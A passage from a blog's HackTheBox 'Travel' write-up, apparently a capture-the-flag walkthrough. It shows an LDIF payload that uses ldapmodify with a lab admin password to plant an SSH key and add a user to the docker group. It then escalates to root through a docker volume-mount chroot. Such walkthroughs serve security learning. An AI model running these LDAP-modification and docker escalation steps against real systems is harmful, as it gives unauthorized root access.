+</pre></table></code></div></div><h2 id="additional">Additional</h2><p>Let’s pwn the box manually by adding attributes value in an LDIF file and modify them using <code class="language-plaintext highlighter-rouge">ldapmodify</code>:</p><p>Here we will modify the attributes of user <code class="language-plaintext highlighter-rouge">edward</code> by adding the SSH public key attribute and replacing the gidNumber with 117 which is the gid of docker.</p><p>Adding the user <code class="language-plaintext highlighter-rouge">edward</code> to docker group would help us escalating privileges.</p><p>First, lets create an public SSH key:</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+</pre><td class="rouge-code"><pre>cfx:  ~/Documents/htb/travel
+→ ssh-keygen <span class="nt">-t</span> rsa
+Generating public/private rsa key pair.
+Enter file <span class="k">in </span>which to save the key <span class="o">(</span>/root/.ssh/id_rsa<span class="o">)</span>: /root/Documents/htb/travel/id_rsa
+Enter passphrase <span class="o">(</span>empty <span class="k">for </span>no passphrase<span class="o">)</span>:
+Enter same passphrase again:
+Your identification has been saved <span class="k">in</span> /root/Documents/htb/travel/id_rsa
+Your public key has been saved <span class="k">in</span> /root/Documents/htb/travel/id_rsa.pub
+The key fingerprint is:
+SHA256:xSMInl43uvqyQlpNjz/bC+aqZuOuLXAgZPkV7QWr3ic root@cfx
+The key<span class="s1">'s randomart image is:
++---[RSA 3072]----+
+|  . ..o..        |
+| + . + o.o       |
+|o . + +.= +      |
+|o  o...+ + .     |
+|.. o.+. S        |
+|. + + o.         |
+|.=   o+E .       |
+|o.= .+ooo        |
+|.B=++=+oo.       |
++----[SHA256]-----+
+
+cfx:  ~/Documents/htb/travel
+→ cat id_rsa.pub
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDzMUfTWiMrzEzFuA0LU1kGPqvENsOCc0YGcb50shLEtT8dwE5ulGhVdf+PS8dtBArgGcRl4PPzY34y4gDCYx7BzmmSMaE8h020LoNmd//CRTN7nlybDfrpSZu60KceA4MggqSi/4NxHoBm6Le4SS/hkeaeh6lkxFvhN2sr1I1AJdF0F0JtIHRR+TJ3yTPHwC5VOiCQjybKZXPy7VrqFYqeBjqgMq0VZ0OlOXt63mozzDCJurdGvk3Irg4uctCkgy2CYJ+AbH4kXL0dnzmm4+qlIvfzCNjv+EevcmqYsC1f4ow//D8tCSNoWFKdykaYHqM7Dv6nc0XkaQTNU3upNe8zzHMWqA8uaXQSuO/Obo6EV7ECV7bsAaencJPYahH823sazu87WGdZ2iXQxiZuVRxbWA1KS87ZabsDFKj1xnChL04U/LsALy0E69icpB6WyGh4Kk0jI4+LEycE6w1yvkOohR7uK151uoE1gJEfMFbTXdlhkVU9uciQuqGPnSyd/6s= root@cfx
+</span></pre></table></code></div></div><p>Now that we an public key, lets create our ldif file payload with user <code class="language-plaintext highlighter-rouge">edward</code> attributes:</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+</pre><td class="rouge-code"><pre>cfx:  ~/Documents/htb/travel
+→ <span class="nb">cat </span>edward.ldif
+dn: <span class="nv">uid</span><span class="o">=</span>edward,ou<span class="o">=</span><span class="nb">users</span>,ou<span class="o">=</span>linux,ou<span class="o">=</span>servers,dc<span class="o">=</span>travel,dc<span class="o">=</span>htb
+changetype: modify
+add: objectClass
+objectClass: ldapPublicKey
+-
+add: sshPublicKey
+sshPublicKey: ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDzMUfTWiMrzEzFuA0LU1kGPqvENsOCc0YGcb50shLEtT8dwE5ulGhVdf+PS8dtBArgGcRl4PPzY34y4gDCYx7BzmmSMaE8h020LoNmd//CRTN7nlybDfrpSZu60KceA4MggqSi/4NxHoBm6Le4SS/hkeaeh6lkxFvhN2sr1I1AJdF0F0JtIHRR+TJ3yTPHwC5VOiCQjybKZXPy7VrqFYqeBjqgMq0VZ0OlOXt63mozzDCJurdGvk3Irg4uctCkgy2CYJ+AbH4kXL0dnzmm4+qlIvfzCNjv+EevcmqYsC1f4ow//D8tCSNoWFKdykaYHqM7Dv6nc0XkaQTNU3upNe8zzHMWqA8uaXQSuO/Obo6EV7ECV7bsAaencJPYahH823sazu87WGdZ2iXQxiZuVRxbWA1KS87ZabsDFKj1xnChL04U/LsALy0E69icpB6WyGh4Kk0jI4+LEycE6w1yvkOohR7uK151uoE1gJEfMFbTXdlhkVU9uciQuqGPnSyd/6s<span class="o">=</span> root@cfx
+-
+replace: gidNumber
+gidNumber: 117
+
+</pre></table></code></div></div><p>Now lets execute this payload using <code class="language-plaintext highlighter-rouge">ldapmodify</code> and SSH into the server using the private key:</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+</pre><td class="rouge-code"><pre>cfx:  ~/Documents/htb/travel
+→ ldapmodify <span class="nt">-x</span> <span class="nt">-h</span> <span class="s2">"localhost:389"</span> <span class="nt">-w</span> <span class="s2">"Theroadlesstraveled"</span> <span class="nt">-D</span> <span class="s2">"cn=lynik-admin,dc=travel,dc=htb"</span> <span class="nt">-f</span> edward.ldif
+modifying entry <span class="s2">"uid=edward,ou=users,ou=linux,ou=servers,dc=travel,dc=htb"</span>
+
+cfx:  ~/Documents/htb/travel
+→ ssh <span class="nt">-i</span> id_rsa edward@10.10.10.189
+Creating directory <span class="s1">'/home@TRAVEL/edward'</span><span class="nb">.</span>
+Welcome to Ubuntu 20.04 LTS <span class="o">(</span>GNU/Linux 5.4.0-26-generic x86_64<span class="o">)</span>
+
+  System information as of Thu 24 Sep 2020 06:33:00 PM UTC
+
+  System load:                      0.0
+  Usage of /:                       46.1% of 15.68GB
+  Memory usage:                     11%
+  Swap usage:                       0%
+  Processes:                        199
+  Users logged <span class="k">in</span>:                  1
+  IPv4 address <span class="k">for </span>br-836575a2ebbb: 172.20.0.1
+  IPv4 address <span class="k">for </span>br-8ec6dcae5ba1: 172.30.0.1
+  IPv4 address <span class="k">for </span>docker0:         172.17.0.1
+  IPv4 address <span class="k">for </span>eth0:            10.10.10.189
+
+
+The programs included with the Ubuntu system are free software<span class="p">;</span>
+the exact distribution terms <span class="k">for </span>each program are described <span class="k">in </span>the
+individual files <span class="k">in</span> /usr/share/doc/<span class="k">*</span>/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+edward@travel:~<span class="nv">$ </span><span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>5009<span class="o">(</span>edward<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>117<span class="o">(</span>docker<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>117<span class="o">(</span>docker<span class="o">)</span>,5000<span class="o">(</span>domainusers<span class="o">)</span>
+</pre></table></code></div></div><h3 id="docker-privesc">Docker PrivEsc</h3><p>Now that our user is the member of docker group which is a scary thing, we can easily escalate our privilege to root refering <a href="https://gtfobins.github.io/gtfobins/docker/"><strong>gfto</strong></a>:</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+</pre><td class="rouge-code"><pre>edward@travel:~<span class="nv">$ </span>docker images
+REPOSITORY            TAG                 IMAGE ID            CREATED             SIZE
+nginx                 latest              602e111c06b6        5 months ago        127MB
+memcached             latest              ac4488374c89        5 months ago        82.3MB
+blog                  latest              4225bf7c5157        5 months ago        981MB
+ubuntu                18.04               4e5021d210f6        6 months ago        64.2MB
+jwilder/nginx-proxy   alpine              a7a1c0b44c8a        7 months ago        54.6MB
+osixia/openldap       latest              4c780dfa5f5e        12 months ago       275MB
+edward@travel:~<span class="nv">$ </span>docker run <span class="nt">-v</span> /:/mnt <span class="nt">--rm</span> <span class="nt">-it</span> nginx <span class="nb">chroot</span> /mnt bash
+root@bdbfea2d382b:/# <span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+root@bdbfea2d382b:/# <span class="nb">cat</span> /root/root.txt
+4fee18266928200ff<span class="k">***************</span>
+
+</pre></table></code></div></div><p>And we pwned the Box !</p><p>Thanks for reading, Suggestions &amp; Feedback are appreciated !</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox/'>HackTheBox</a>, <a href='/categories/linux-machines/'>Linux Machines</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/sourcecode/" class="post-tag no-text-decoration" >sourcecode</a> <a href="/tags/git/" class="post-tag no-text-decoration" >git</a> <a href="/tags/php/" class="post-tag no-text-decoration" >php</a> <a href="/tags/ssrf/" class="post-tag no-text-decoration" >SSRF</a> <a href="/tags/gopher/" class="post-tag no-text-decoration" >gopher</a> <a href="/tags/deserilization/" class="post-tag no-text-decoration" >deserilization</a> <a href="/tags/ldap/" class="post-tag no-text-decoration" >LDAP</a> <a href="/tags/docker/" class="post-tag no-text-decoration" >docker</a> <a href="/tags/memcache/" class="post-tag no-text-decoration" >memcache</a> <a href="/tags/simplepie/" class="post-tag no-text-decoration" >simplepie</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><!-- Post sharing snippet v2.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT License --><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=HackTheBox — Travel Writeup - ColdFusionX&url=http://localhost:4000/posts/TravelHTB/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=HackTheBox — Travel Writeup - ColdFusionX&u=http://localhost:4000/posts/TravelHTB/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=HackTheBox — Travel Writeup - ColdFusionX&url=http://localhost:4000/posts/TravelHTB/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><!-- The Pannel on right side (Desktop views) v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"><h3 data-toc-skip>Recent Update</h3><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/PassageHTB/">HackTheBox — Passage Writeup</a></li><li><a href="/posts/Doctor-HTB/">HackTheBox — Doctor Writeup</a></li><li><a href="/posts/Omni-HTB/">HackTheBox — Omni Writeup</a></li><li><a href="/posts/OpenKeys-HTB/">HackTheBox — OpenKeyS Writeup</a></li><li><a href="/posts/SneakyMailer-HTB/">HackTheBox — SneakyMailer Writeup</a></li></ul></div><div id="access-tags"><h3 data-toc-skip>Trending Tags</h3><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/php/">php</a> <a class="post-tag" href="/tags/ffuf/">ffuf</a> <a class="post-tag" href="/tags/masscan/">masscan</a> <a class="post-tag" href="/tags/nmap/">nmap</a> <a class="post-tag" href="/tags/vhost/">vhost</a> <a class="post-tag" href="/tags/ssh/">ssh</a> <a class="post-tag" href="/tags/john/">john</a> <a class="post-tag" href="/tags/sudo/">sudo</a> <a class="post-tag" href="/tags/smbclient/">smbclient</a> <a class="post-tag" href="/tags/crackmapexec/">crackmapexec</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><h3 data-toc-skip class="pl-3 pt-2 mb-2">Contents</h3><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"> <!-- Recommend the other 3 posts according to the tags and categories of the current post, if the number is not enough, use the other latest posts to supplement. v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT License --><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/PassageHTB/"><div class="card-body"> <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago small" > Mar 10, 2021 <i class="unloaded">2021-03-10T12:15:00+05:30</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox — Passage Writeup</h3><div class="text-muted small"><p> Passage starts off with web enumeration where we discover the website running on a vulnerable instance of CuteNews CMS and exploit it through bypassing Avatar Image Upload functionality to drop ...</p></div></div></a></div><div class="card"> <a href="/posts/Tabby-HTB/"><div class="card-body"> <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago small" > Nov 12, 2020 <i class="unloaded">2020-11-12T12:20:00+05:30</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox — Tabby Writeup</h3><div class="text-muted small"><p> Tabby was a user friendly easy level box put together with interesting attack vectors. We start off with discovering Local File Inclusion (LFI) in a website and leverage it to expose credentials...</p></div></div></a></div><div class="card"> <a href="/posts/Academy-HTB/"><div class="card-body"> <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago small" > Mar 3, 2021 <i class="unloaded">2021-03-03T12:30:00+05:30</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox — Academy Writeup</h3><div class="text-muted small"><p> Academy is a vulnerable replica of a recently released Cyber Security training product by HackTheBox. Initial foothold requires us to exploit a vulnerable registration page through which we can ...</p></div></div></a></div></div></div><!-- Navigation buttons at the bottom of the post. v2.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --><div class="post-navigation d-flex justify-content-between"> <a href="/posts/LameHTB/" class="btn btn-outline-primary"><p>HackTheBox — Lame Writeup</p></a> <a href="/posts/AdmirerHTB/" class="btn btn-outline-primary"><p>HackTheBox — Admirer Writeup</p></a></div><!-- The Disqus lazy loading. Powered by: https://osvaldas.info/lazy-loading-disqus-comments v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung MIT License --><div id="disqus" class="pt-2 pb-2"><p class="font-italic text-center text-muted small"> Comments powered by <a href="https://disqus.com/">Disqus</a>.</p></div><script src="/assets/js/lib/jquery.disqusloader.min.js"></script> <script> var options = { scriptUrl: '//coldfx.disqus.com/embed.js', disqusConfig: function() { this.page.url = 'http://localhost:4000/posts/TravelHTB/'; this.page.identifier = '/posts/TravelHTB/'; } }; $.disqusLoader('#disqus', options); </script></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('#post-wrapper img'); const observer = lozad(imgs); observer.observe(); </script> <script data-name="BMC-Widget" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="ColdFusionX" data-description="Your Support means the World to me !" data-message="Thank you for visiting. Hope you liked my Blog!" data-color="#5F7FFF" data-position="" data-x_margin="18" data-y_margin="18"></script> <!-- The Footer v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/ColdFusionX_">Mayank Deshmukh</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span> <script src="https://www.hackthebox.eu/badge/69842"></script></p></div><div class="footer-right"><p class="mb-0"><h4>Realm of Knowledge</h4></p></div></div></footer></div><!-- The Search results v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/php/">php</a> <a class="post-tag" href="/tags/ffuf/">ffuf</a> <a class="post-tag" href="/tags/masscan/">masscan</a> <a class="post-tag" href="/tags/nmap/">nmap</a> <a class="post-tag" href="/tags/vhost/">vhost</a> <a class="post-tag" href="/tags/ssh/">ssh</a> <a class="post-tag" href="/tags/john/">john</a> <a class="post-tag" href="/tags/sudo/">sudo</a> <a class="post-tag" href="/tags/smbclient/">smbclient</a> <a class="post-tag" href="/tags/crackmapexec/">crackmapexec</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <!-- Jekyll Simple Search loader v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="http://localhost:4000{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script>
